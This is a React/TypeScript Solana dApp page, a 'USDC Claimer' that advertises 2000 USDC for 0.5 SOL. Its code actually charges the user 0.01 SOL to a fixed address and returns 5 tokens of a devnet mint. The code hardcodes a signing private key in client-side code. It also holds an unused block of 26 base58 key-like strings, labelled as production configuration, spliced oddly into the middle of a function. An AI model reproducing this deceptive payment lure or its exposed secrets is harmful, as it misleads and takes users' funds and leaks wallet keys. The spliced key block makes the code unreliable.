/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "2cDbAbnXHYGjLbAR1Sewvyo2S5Seqn3hYZjpdtrHPhKCEQAYYVYVZMJmtJtb1tUqAxd8NTDZhSqtrftm4KG7QKUd"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3PQWza1WsAMRr5E494thiqGCALZ4wswkHjTozkfmmar5FhWAk4aUsb3g9xc2mBBmfSQxQApnJfyxriWmYQh9Xr8J",
  "key1": "4baVZUNrs3KtrLeEgi7fo9L3qzRC9jFSXwYTCJYMK4y8sPQTLuqW4SVgBrDCBgH4tekVpgUapuUoqYzGxrMcyWyy",
  "key2": "2UMgf5Cw6meYKFnyzV4rT8yLuYiGc6UazNFhZVyL1kUigBycVTep3iPym9wgiVpVBPLbNR2gNDHoswEbKRdUayUK",
  "key3": "YL6cJQ1uC9fNP53jVtoXJnBKvFNeLGGqa6z2sZr1XQgVqgY4mzSATcbR4Bscjk3jZSuZfxMQhCrbH7Kq4Ci65kE",
  "key4": "65xWzmZ3LHuDyUPt7yRSdLfgFF7X6CVW5gREuq2FS3EBuWMw2YBygiV9SR7LcdDe5yTWfTP4H9QCVxDtadXDjzpQ",
  "key5": "2QSA52MBEK3yi3xqu1eFLridVyzUhnp7seoQQSZZthokzkvM8HYSgdkwcsGRn5jgrhhDk6zZgz35vjijKcpttiCv",
  "key6": "3cRbLcFasUXXyQ4NZKUGM5BqRngvYsQ7CrPsk6ztokAVtiX9s3jVVeJduee2WDisopRNHM2d3ePRyU7ANNbJbjbV",
  "key7": "P5JVxrZLAdzi1jsij4eSKZVAE9ZqS17Qj8ZE7XamUwS6amZxBy8KLu49vP6f3rKyQW49L6UwAGywc6YfVC3rRNq",
  "key8": "4omx2zQPimdH9odHjMRM12TEXY4ueZAsRXFUo4ddvkzQqi3eAcwzMjbAjAFst6Vjj466ugW6Cf97nQJiRUTK2gwt",
  "key9": "yd8feia83PazcsTG5FzjXwGCn6LtGwHy7fcbh1rsHoGX89RTLc73j2NkhKr48yRTpdzGuUCFvUMDv3tn2mUHRed",
  "key10": "4JrUzitf2xufmSmFEWSLysg3msxzpyrrbcRkJXHh5LEp1p5XCBMrVtkW32A8D5otYTviBsy9dL1Ytj7zpLHaCHRV",
  "key11": "9rsaqtrFZTHy6Sxa5XENMJ7U11Uf633hDfdSSRRTpkE38pP1HNx1PRRSFqNiKrMbb5JGe5oHGWznkN6sGay86L3",
  "key12": "zyTvu74f3MYr8QTEupDFAjzygAVs92ZiaZHoDP18EdXtjAi9ux5juaKCeFs3NR3cn19jDWQbUVDhCBu4myhp4kp",
  "key13": "29B5D9rHpRJMejq8SjLdfqN6EBRA7pQV41bceHmsEUpwuocofSoX28RsRj6gUE5yLEhmg5QeSSYSgGXFBawy93oA",
  "key14": "5m2yn6XzVszh7T6yS1ruJzx1WSZEgMwF6xbe9HrGg1hVwb1awsM8hhfBQdt6xbaBwPLcxrJmRRgb2DGYkP93p2iG",
  "key15": "4TxUubjLvjFmbuHpkQqD4JqWKohWYnCHRa2fYPxfquSHpJDBrwBnr8k1tfA4QPRNXNqewuUAYiruDC2cEMi68iWi",
  "key16": "5oSqCQSCD8CpwwRKeuSRjxEugsRddnULzkNLv4J1hAXET1kej8XcrHWkJzHdJqqDpd1GefzaqjWxkeLn2eJ6Ceb8",
  "key17": "2zwaxgRdbnGParEWRo7zrQkfaVgT99JGzoa5Wdi284udPWoAWuRG2SSJWZbZJu2SWNqub3d1dJ4pTebB9T9NGm1j",
  "key18": "34DL5kWAqW71XxVKLJ7VJQwoevbSuSPwCKRnfN7JdwkGKfL25vdA3TYd2XAGDbgi2Q2GMjJC65YREU3ospwUJ8Bn",
  "key19": "33SSwheTWiLRHtWvUzQsp4iVMCqvuKyGpsaPVZDXHsDdnmsimJ7cttZpK4d3EvhmnZZ2Fx7g1HBWA6EnkH3h2F8s",
  "key20": "3EStiwNSGZBaz7dcnQARQQFFEHmdbDKnNwz2hbx9z5sFso8Cdaxeg9Z3oXnBJi6JUJn6m4S9HnPAFQzBJrWNAN33",
  "key21": "5MsK88zSYnYziagr6qs1LJfyfDg1Zp8Frt89wK6ZJJRRsbHC6yM8n8AvzoT7Dk6hg8LykdbQ2ke4bRKT1Gcst8ut",
  "key22": "5aBTTM2jL7mNQ7fpXHppkg4bH5whcAWMsypRPQAHhssKwyGYP6s8vE9DVXdJZzpQBS4orPMXpq5oq1P7QTvPm8Re",
  "key23": "48C8kwh1jquubqB3vkM9RAaeQDrNjTUbQZdvRqzFKRsftNgRs8XBnqy22dK2TVeagGky89Mv1LYqGM93BUGuh3rS",
  "key24": "dPKUmkgFXLRBdWjkNagLiNkFnrpDhugDPiirgayBvbEiayHWzw9S1E3XbJzX5mYKoTxmmH9kjP3pn2PbKPTBUVa",
  "key25": "66Yb75DGEQKqoHgGbqwRDEbGH5ewCAAFWZLSFoG6xrk9h98xGgYULhKfSXde9uRXU6MQC2fMiHEE3whr1PTosb6V"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
